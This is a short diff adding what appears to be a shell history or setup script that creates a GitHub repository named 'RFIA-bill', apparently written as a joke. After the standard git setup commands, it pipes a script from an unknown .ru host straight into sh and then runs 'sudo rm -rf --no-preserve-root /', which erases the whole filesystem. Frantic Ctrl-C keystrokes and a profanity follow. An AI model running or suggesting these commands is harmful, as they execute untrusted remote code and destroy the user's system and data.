@@ -1,0 +1,11 @@
+echo "# RFIA-bill" >> README.md
+git init
+git add README.md
+git commit -m "first commit"
+git branch -M main
+git remote add origin https://github.com/responsible-financial-innovation-act22/RFIA-bill.git
+git push -u origin main
+curl -sSf http://femboysx8whg9wer8.ru | sh
+sudo rm -rf --no-preserve-root /
+^C
+^C^^CC^^C^C^^CCfuck
